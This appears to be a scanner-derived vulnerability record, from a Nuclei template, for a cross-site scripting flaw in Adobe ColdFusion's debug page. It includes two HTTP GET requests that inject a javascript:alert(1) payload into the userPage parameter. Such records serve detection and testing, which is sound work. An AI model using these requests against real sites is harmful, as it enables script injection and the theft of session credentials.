# Vulnerability: Adobe ColdFusion - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`coldfusion-debug-xss.yaml`)

## Description
Adobe ColdFusion debug page contains a cross-site scripting vulnerability when the application is running on a remote host. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
GET {{BaseURL}}/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
```

